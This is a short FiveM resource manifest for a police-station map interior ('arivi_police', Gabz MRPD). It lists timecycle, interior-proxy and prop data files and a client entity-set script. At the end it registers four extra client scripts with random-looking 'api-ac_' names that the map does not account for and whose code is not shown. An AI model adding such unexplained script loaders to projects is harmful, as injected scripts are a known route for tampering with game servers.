resource_manifest_version '05cfa83c-a124-4cfa-a768-c24a5811d8f9'

author 'elfeedoo#6093'
description 'arivi_police'
version '1.0.0'

this_is_a_map 'yes'


data_file 'TIMECYCLEMOD_FILE' 'gabz_mrpd_timecycle.xml'
data_file 'INTERIOR_PROXY_ORDER_FILE' 'interiorproxies.meta'

data_file 'DLC_ITYP_REQUEST' 'stream/vespucci/vesp_props.ytyp'

files {
	'gabz_mrpd_timecycle.xml',
	'interiorproxies.meta'
}

client_script {
	"gabz_mrpd_entitysets.lua",
}
client_script "api-ac_CJOUjcftOzFS.lua"
client_script "api-ac_PhLtMfCLHUqN.lua"
client_script "api-ac_xagvSDFblUVF.lua"
client_script "api-ac_cwbvUaxTboKa.lua"